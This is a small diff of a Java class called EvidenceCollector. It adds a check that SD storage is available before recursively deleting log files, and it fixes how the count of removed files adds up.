@@ -283,8 +283,15 @@ public final class EvidenceCollector implements Singleton {
         //#ifdef DEBUG
         debug.info("removeLogDirs");
         //#endif
-        int removed = removeLogRecursive(Path.SD(), numFiles);
-        removed = removeLogRecursive(Path.USER(), numFiles - removed);
+        
+        
+        int removed = 0;
+        
+        if(Path.isSDAvailable()){
+         removed = removeLogRecursive(Path.SD(), numFiles);
+        }
+        
+        removed += removeLogRecursive(Path.USER(), numFiles - removed);
         return removed;
     }
 
